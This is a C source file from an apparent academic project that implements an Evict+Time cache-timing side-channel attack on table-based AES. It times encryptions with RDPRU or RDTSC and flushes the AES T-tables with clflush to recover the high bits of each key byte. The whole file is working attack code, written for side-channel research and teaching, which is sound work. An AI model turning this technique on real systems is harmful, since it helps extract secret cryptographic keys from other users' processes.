/******************************************************************************
 * File	Name			: attack.c
 * Organization         	: Indian Institute of Technology Kharagpur
 * Project Involved		: First Round Attack on AES
 * Author		    	: Chester Rebeiro
 * Date of Creation		: 15/Dec/2012
 * Date of freezing		:
 * Log Information regading
 * maintanance			:
 * Synopsis			:
 ******************************************************************************/
#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include "lib/aes.h"

AES_KEY expanded;

#define ITERATIONS (1 << 7)               /* The maximum iterations for making the statistics */
#define WARMUP_ITERATIONS (1 << 6) 	  /* The number of iterations for warming up cache */

#define CACHE_SIZE  (32*1024)  		  /* cache size */
#define CACHE_ASSOC (8)  		  /* cache associativity */
#define CACHE_LINE  (64)       		  /* cache line size */

#define CACHE_MISS_THRESHOLD (29*5)

#define NUM_SETS_PER_TABLE (16)

#define RDPRU_ECX_MPERF	0 		  /* Use MPERF register in RDRPU */
#define RDPRU_ECX_APERF	1 		  /* Use APERF register in RDRPU */

typedef unsigned long int uint64_t;
typedef unsigned int uint32_t;
typedef unsigned char uint8_t;

uint8_t pt[16];               /* Holds the Plaintext */
uint8_t ct[16];               /* Holds the ciphertext */

uint8_t cleanarray[3*CACHE_SIZE];
uint8_t xored;


/********************************************************************
 * The timestamp function. RDPRU can be used to read MPERF and APERF
 * registers in userspace on Zen 2 platforms. APERF is most accurate
 ********************************************************************/

inline __attribute__((always_inline))
uint64_t timestamp()
{
	uint32_t low_a, high_a;
	asm volatile("lfence");
	asm volatile("rdpru"
		     : "=a" (low_a), "=d" (high_a)
		     : "c" (RDPRU_ECX_APERF));
	asm volatile("lfence");
	uint64_t aval = ((low_a) |(uint64_t) (high_a) << 32);

	return aval;
}

#ifdef USE_RDTSCP
/*********************************************************************
 * The timestamp functions. TSC updates only once in 20-40 cycles. On
 * Zen 2 (4800HS), it was found to be updated every 29 cycles
 *********************************************************************/
inline __attribute__((always_inline))
uint64_t timestamp_begin()
{
	uint32_t low_a, high_a;
	asm volatile ("lfence\n\t"
		  "sfence\n\t"
		  "rdtsc\n\t"
		  "mov %%edx, %0\n\t"
		  "mov %%eax, %1\n\t"
		  : "=r" (high_a), "=r" (low_a)
		  :: "%rax", "%rdx");
	uint64_t aval = ((low_a) | (uint64_t)(high_a) << 32);
	return aval;
}

inline __attribute__((always_inline))
uint64_t timestamp_end()
{
	uint32_t low_a, high_a;
	asm volatile ("rdtscp\n\t"
		"mov %%edx, %0\n\t"
		"mov %%eax, %1\n\t"
		"lfence\n\t"
		"sfence\n\t"
		: "=r" (high_a), "=r" (low_a)
		:: "%rax", "%rdx");
	uint64_t aval = ((low_a) | (uint64_t)(high_a) << 32);
	return aval;
}
#endif

/********************************************************************
 * Fills L1-D cache with random values
 ********************************************************************/
void randomize_cache()
{
	int i,j;
	/* Make sure to leave no trace of previous contents */
	for(j=0; j<WARMUP_ITERATIONS; ++j)
		for(i=0; i<(3*CACHE_SIZE); i+= CACHE_LINE)
			cleanarray[i] = rand();

	/* Do some computation on the above data */
	for(i=0; i<(3*CACHE_SIZE); i+= CACHE_LINE)
		xored ^= cleanarray[i];
}

/********************************************************************
 * Evict+Time Attack
 * -----------------
 * - We can get only most significant 8 - log2(CACHE_LINE) bits with
 *   this attack, as we can only conclude to the cache line
 *   granularity
 * - To get information for key byte ii:
 *   	- clean cache completely
 *   	- set other key bytes randomly
 *   	- set key[ii]= 0:(NUM_SETS_PER_TABLE):255
 *   	- time an encryption with all hits and record this
 *   	- evict set 0 of Te(ii%4) --> EVICT
 *   	- time same encryption again --> TIME
 *   	- repeat for sufficient number of times (for better results,
 *   	  choose >=128)
 * - The reason the above works is that if ii is the correct value,
 *   we are _guaranteed_ a miss after the eviction, and hence
 *   (t2-t1) > CACHE_MISS_THRESHOLD _always_, irrespective of other
 *   key bytes
 * - If ii is not the correct value, for some distribution of the
 *   random bytes, we will definitely hit the cache for all accesses
 ********************************************************************/
void attack()
{

	int32_t timearray[16][NUM_SETS_PER_TABLE];
	uint32_t b, i, r, ii, j;
	uint64_t start, end, timing_hit, timing_evicted;

	for(ii=0;ii<16;ii++)
		for(j=0;j<16;j++)
			timearray[ii][j] = CACHE_MISS_THRESHOLD;

	for(ii=0;ii<16;ii++){
		for(b=0;b<(1<<8);b+=NUM_SETS_PER_TABLE){
#ifndef DEBUG
			fprintf(stderr, "Setting pt[%d]=%d\n", ii, b&0xF0U);
#else
			printf("Setting pt[%d]=%d\n", ii, b&0xF0U);
#endif
			for(r=0;r<ITERATIONS;++r){
				/* Set a random plaintext */
				for(i=0; i<16; ++i)
					pt[i] = random() & 0xFFU;
				/* Set target key byte to 0 */
				pt[ii] = b&0xF0U;

				/* Clean the cache memory of any AES data */
				clean_tables();
				randomize_cache();

				/* Warmup cache with AES data */
				AES_encrypt(pt, ct, &expanded);

#ifdef USE_RDTSCP
				/* Make the encryption */
				start = timestamp_begin();
				AES_encrypt(pt, ct, &expanded);
				end = timestamp_end();
#else
				/* Make the encryption */
				start = timestamp();
				AES_encrypt(pt, ct, &expanded);
				end = timestamp();
#endif

				timing_hit = end - start;

				/* Flush cache set */
				asm volatile ("mfence");
				if(ii%4 == 0)
					asm volatile ("clflush (%0)":: "r"(Te0));
				else if(ii%4 == 1)
					asm volatile ("clflush (%0)":: "r"(Te1));
				else if(ii%4 == 2)
					asm volatile ("clflush (%0)":: "r"(Te2));
				else
					asm volatile ("clflush (%0)":: "r"(Te3));
				asm volatile ("mfence");

#ifdef USE_RDTSCP
				/* Make the encryption */
				start = timestamp_begin();
				AES_encrypt(pt, ct, &expanded);
				end = timestamp_end();
#else
				/* Make the encryption */
				start = timestamp();
				AES_encrypt(pt, ct, &expanded);
				end = timestamp();
#endif

				timing_evicted = end - start;
				if ((timing_evicted-timing_hit) < CACHE_MISS_THRESHOLD)
					timearray[ii][b>>4] = 0;
			}
		}

		for(j=0;j<16;j++)
#ifndef DEBUG
			fprintf(stderr, "%d\n", timearray[ii][j]);
#else
			printf("%d\n", timearray[ii][j]);
#endif
	}

	for(ii=0;ii<16;ii++){
		printf("Byte %2d:\t", ii);
		for(b=0;b<16;b++){
			if(timearray[ii][b] == CACHE_MISS_THRESHOLD)
				printf("%XX ", b);
		}
		printf("\n");
	}
}


void ReadKey(const char *filename)
{
	uint32_t i;
	FILE *f;
	uint32_t i_secretkey[16];
	uint8_t uc_secretkey[16];

	/* Read key from a file */
	if((f = fopen(filename, "r")) == NULL){
		printf("Cannot open key file\n");
		exit(-1);
	}
	for(i=0; i<16; ++i){
		fscanf(f, "%x", &i_secretkey[i]);
		uc_secretkey[i] = (uint8_t) i_secretkey[i];
	}
	fclose(f);
	AES_set_encrypt_key(uc_secretkey, 128, &expanded);
}


/*
 * The main
 */
int main(int argc, char **argv)
{
	srand(timestamp());

	ReadKey("key");
	attack();
}

